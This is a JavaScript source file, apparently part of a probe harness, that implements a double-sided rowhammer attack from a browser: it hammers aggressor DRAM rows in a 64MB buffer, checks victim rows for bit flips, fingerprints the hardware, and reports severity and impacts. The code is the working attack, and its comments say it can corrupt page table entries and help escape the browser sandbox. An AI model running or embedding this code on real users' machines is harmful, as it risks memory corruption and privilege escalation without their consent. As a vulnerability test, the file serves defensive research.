// ── Rowhammer.js — DRAM bit-flip attack from browser JavaScript ──────────────
// Based on: Gruss et al. "Rowhammer.js" (2016), Google Project Zero
//
// Causes physical DRAM bit flips by rapidly accessing (hammering) specific
// memory rows, exploiting electrical interference between adjacent DRAM rows.
// Can corrupt page table entries to gain write access to other processes.
//
// Requirements:
// - DDR3 or DDR4 without effective TRR (Target Row Refresh)
// - Large contiguous memory allocation via ArrayBuffer
// - Sufficient hammering iterations to cause bit flips
//
// Note: Modern DDR4/DDR5 with TRR makes this harder but NOT impossible.
// Research shows TRR can be bypassed (TRRespass, 2020).

var results = {
  phase: 'initializing',
  hardware: {},
  vulnerable: false,
  bit_flips: [],
  rows_tested: 0,
  total_hammers: 0,
  duration_ms: 0,
  timestamp: new Date().toISOString()
};

results.hardware = {
  cores: navigator.hardwareConcurrency || 0,
  memory_gb: navigator.deviceMemory || 'unknown',
  platform: navigator.platform,
  ua: navigator.userAgent
};

// ── 1. Allocate large memory buffer ──────────────────────────────────────────
// We need a large buffer to increase chances of spanning multiple DRAM rows
// Typical DRAM row = 8KB. We want many rows to test.
var BUFFER_SIZE = 64 * 1024 * 1024; // 64MB
var HAMMER_ITERATIONS = 1000000;     // Accesses per hammer round
var ROW_SIZE = 8192;                 // Typical DRAM row size
var NUM_ROWS_TO_TEST = 100;          // Test this many row pairs
var CACHE_LINE = 64;

var buffer;
try {
  buffer = new ArrayBuffer(BUFFER_SIZE);
  results.buffer_mb = BUFFER_SIZE / (1024 * 1024);
} catch(e) {
  results.error = 'Could not allocate ' + (BUFFER_SIZE/1024/1024) + 'MB buffer: ' + e.message;
  results.note = 'Rowhammer requires large memory allocation. Try reducing other tab memory usage.';
  __pzResult(results);
  return;
}

var view = new Uint8Array(buffer);
var view32 = new Uint32Array(buffer);

// ── 2. Initialize memory with known pattern ──────────────────────────────────
// Fill with 0xFF — bit flips will show as bits going from 1→0
results.phase = 'initializing_memory';
for (var i = 0; i < view.length; i += 4) {
  view32[i >> 2] = 0xFFFFFFFF;
}

// ── 3. Cache eviction function ───────────────────────────────────────────────
// We need to evict target addresses from cache so each access goes to DRAM
// Use a large eviction buffer
var evictBuffer = new Uint8Array(8 * 1024 * 1024);
function evict() {
  var sum = 0;
  for (var i = 0; i < evictBuffer.length; i += CACHE_LINE) {
    sum += evictBuffer[i];
  }
  return sum;
}

// ── 4. Double-sided rowhammer ────────────────────────────────────────────────
// Hammer two rows adjacent to a victim row — significantly more effective
// than single-sided hammering
function hammerPair(addr1, addr2, iterations) {
  // Rapid alternating access to two addresses in different DRAM rows
  // Each access must go to DRAM (not cache), so we use cache line conflicts
  for (var i = 0; i < iterations; i++) {
    // Access both addresses — these should map to adjacent DRAM rows
    view[addr1] |= 0;
    view[addr2] |= 0;

    // Attempt to evict from cache using conflicting addresses
    // The clflush instruction isn't available from JS, so we use
    // cache eviction via conflict addresses
    if (i % 1000 === 0) {
      // Periodic eviction to ensure we're hitting DRAM
      view[addr1 ^ CACHE_LINE] |= 0;
      view[addr2 ^ CACHE_LINE] |= 0;
    }
  }
}

// ── 5. Check for bit flips in the victim row ─────────────────────────────────
function checkFlips(rowStart, rowEnd) {
  var flips = [];
  for (var i = rowStart; i < rowEnd; i++) {
    if (view[i] !== 0xFF) {
      flips.push({
        offset: i,
        expected: 0xFF,
        actual: view[i],
        flipped_bits: (0xFF ^ view[i]).toString(2),
        hex: '0x' + ('0' + view[i].toString(16)).slice(-2)
      });
      // Reset for next round
      view[i] = 0xFF;
    }
  }
  return flips;
}

// ── 6. Main hammering loop ───────────────────────────────────────────────────
results.phase = 'hammering';
var startTime = performance.now();
var allFlips = [];

// Test multiple row pairs across the buffer
for (var rowIdx = 0; rowIdx < NUM_ROWS_TO_TEST; rowIdx++) {
  // Pick addresses in different DRAM rows
  // Row N-1 and Row N+1 are the aggressor rows
  // Row N is the victim row we check for bit flips
  var baseOffset = (rowIdx * 3 + 1) * ROW_SIZE; // Skip around the buffer
  if (baseOffset + ROW_SIZE * 3 >= BUFFER_SIZE) break;

  var aggressorAddr1 = baseOffset;                    // Row N-1
  var victimRowStart = baseOffset + ROW_SIZE;          // Row N (victim)
  var victimRowEnd   = victimRowStart + ROW_SIZE;
  var aggressorAddr2 = baseOffset + ROW_SIZE * 2;     // Row N+1

  // Ensure victim row is initialized
  for (var i = victimRowStart; i < victimRowEnd; i++) {
    view[i] = 0xFF;
  }

  // Hammer the aggressor rows
  hammerPair(aggressorAddr1, aggressorAddr2, HAMMER_ITERATIONS);
  results.total_hammers += HAMMER_ITERATIONS;
  results.rows_tested++;

  // Check victim row for bit flips
  var flips = checkFlips(victimRowStart, victimRowEnd);
  if (flips.length > 0) {
    allFlips.push({
      row_index: rowIdx,
      aggressor1_offset: aggressorAddr1,
      aggressor2_offset: aggressorAddr2,
      victim_row_offset: victimRowStart,
      flips: flips
    });
    results.vulnerable = true;
  }

  // Time check — don't run too long (max 30s)
  if (performance.now() - startTime > 30000) {
    results.note_timeout = 'Stopped after 30s. Tested ' + results.rows_tested + ' of ' + NUM_ROWS_TO_TEST + ' planned rows.';
    break;
  }
}

results.duration_ms = Math.round(performance.now() - startTime);
results.bit_flips = allFlips;
results.phase = 'complete';

// ── 7. Interpret results ─────────────────────────────────────────────────────
var totalFlips = 0;
allFlips.forEach(function(r) { totalFlips += r.flips.length; });

if (results.vulnerable) {
  results.severity = 'CRITICAL';
  results.summary = totalFlips + ' bit flip(s) detected across ' + allFlips.length + ' row(s) in ' + (results.duration_ms/1000).toFixed(1) + 's. DRAM is vulnerable to rowhammer.';
  results.impact = [
    'Bit flips in page table entries can grant write access to kernel memory',
    'Can be used to escape browser sandbox (with sufficient flips in the right location)',
    'Can corrupt other processes\' memory (same physical DRAM)',
    'Academic research has demonstrated full privilege escalation via browser rowhammer'
  ];
  results.mitigations_needed = [
    'ECC RAM (detects and corrects single-bit errors)',
    'TRR (Target Row Refresh) — but can be bypassed',
    'DRAM refresh rate increase',
    'Physical replacement with DDR5 (better row isolation)'
  ];
} else {
  results.severity = 'LOW';
  results.summary = 'No bit flips detected after ' + results.rows_tested + ' rows tested (' + (results.duration_ms/1000).toFixed(1) + 's). DRAM appears resilient or mitigations (TRR/ECC) are active.';
  results.note = 'This does not guarantee safety — rowhammer is probabilistic and may require more rows/time. DDR4 with ineffective TRR can still be vulnerable with longer testing.';
}

// Cleanup
buffer = null;
evictBuffer = null;

__pzResult(results);
return '__async__';
